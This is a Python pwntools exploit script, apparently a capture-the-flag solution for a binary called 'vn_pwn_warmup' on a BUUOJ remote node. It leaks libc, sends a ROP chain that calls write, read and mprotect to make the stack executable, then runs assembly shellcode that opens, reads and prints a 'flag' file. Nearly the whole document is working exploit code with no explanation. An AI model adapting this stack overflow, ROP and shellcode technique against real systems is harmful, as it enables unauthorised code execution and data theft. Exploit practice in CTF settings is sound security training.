import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./vn_pwn_warmup')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./vn_pwn_warmup')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29427)
			elf=ELF('./vn_pwn_warmup')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		

		io.recvuntil('0x')
		libc_base=int(io.recvline(),16)-libc.sym['puts']
		libc.address=libc_base
		io.recv()
		pop_rdx_rsi=0x00000000001150c9+libc_base
		pop_rdx=0x0000000000001b92+libc_base
		pop_rdi=0x0000000000021102+libc_base
		ret=libc_base+0x0000000000000937
		libc_bss=libc_base+0x3C9A00
		pay=p64(pop_rdx)+p64(0x300)+p64(pop_rdi)+p64(1)
		pay+=p64(libc.sym['write'])
		pay+=p64(pop_rdi)+p64(0)+p64(pop_rdx)+p64(0x300)
		pay+=p64(libc.sym['read'])
		# pay+=p64(libc_bss)
		io.send(pay)
		io.recv()
		# gdb.as
		io.send('\x00'*0x78+p64(ret))
		io.recv(0x108)
		stack=u64(io.recv(8))
		success('stack:'+hex(stack))

		shell='''
		push 0
		mov  rax,0x67616c66
		push rax
		mov  rdi,rsp
		mov  rsi,0x0
		xor  rdx,rdx
		mov  rax,0x2
		syscall

		mov  rdi,rax
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x0
		syscall

		mov  rdi,0x1
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x1
		syscall
		'''
		pay=asm(shell)
		pay=pay.ljust(0xd0,'\x00')+p64(pop_rdi)+p64(stack&0xfffffffffffff000)
		pay+=p64(pop_rdx_rsi)+p64(7)+p64(0x1000)
		pay+=p64(libc.sym['mprotect'])+p64(stack-0x2f0)
		io.send(pay)






		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue